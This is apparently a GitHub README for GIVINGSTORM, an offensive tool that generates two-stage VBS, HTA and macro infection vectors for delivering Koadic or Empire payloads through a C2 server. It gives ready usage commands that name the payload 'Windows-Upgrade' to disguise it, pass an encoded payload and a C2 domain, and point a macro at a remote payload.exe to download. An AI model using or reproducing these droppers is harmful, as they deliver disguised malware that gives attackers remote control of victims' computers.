# GIVINGSTORM
[[![MIT license](https://img.shields.io/badge/License-MIT-blue.svg)](https://lbesson.mit-license.org/)
[![PyPI pyversions](https://img.shields.io/pypi/pyversions/ansicolortags.svg)](https://pypi.python.org/pypi/ansicolortags/)
[![Maintenance](https://img.shields.io/badge/Maintained%3F-yes-green.svg)](https://GitHub.com/Naereen/StrapDown.js/graphs/commit-activity)

The beginnings of a C2 framework. Currently without all the C2 stuff so far. Generates
a dual stage VBS infection vector, and a dual stage HTA infection vector. The variables take
into account C2 addresses, Koadic/Empire payloads, and a few delivery mechanisms. The payload
files are output to an aptly named directory "Payloads" that is created if not already present.

# Installation & Usage
GIVINGSTORM is a breeze to use. Simply clone the directory, and cd into it.

For the HTA payload:
  `python3 givingstorm.py -n Windows-Upgrade -p b64encodedpayload -c amazon.com/c2/domain`

# HTA Example
![alt text](https://github.com/nins3i/GIVINGSTORM/blob/master/hta.png)

For the Macro Subroutine:
  `python3 givingstorm.py -n Windows-Upgrade -e amazon.com/final/payload.exe`

# Macro Example
![alt text](https://github.com/nins3i/GIVINGSTORM/blob/master/macro.png)
